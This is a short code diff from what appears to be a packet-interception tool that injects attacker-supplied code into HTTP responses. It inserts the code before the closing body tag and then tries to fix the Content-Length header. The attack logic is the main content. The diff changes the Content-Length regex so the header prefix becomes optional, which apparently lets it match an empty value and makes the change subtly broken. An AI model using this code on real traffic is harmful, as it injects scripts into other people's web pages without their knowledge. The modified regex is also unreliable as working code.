@@ -123,7 +123,7 @@ def process_packet(packet):
             print("[+] Response")
             print("[+] Injection")
             load = load.replace("</body>", options.code + "</body>")
-            content_length_search = re.search(r"(?:Content-Length:\s)(\d*)", load)
+            content_length_search = re.search(r"(?:Content-Length:\s)?(\d*)", load)
 
             if content_length_search and "text/html" in load:
                 content_length = content_length_search.group(1)
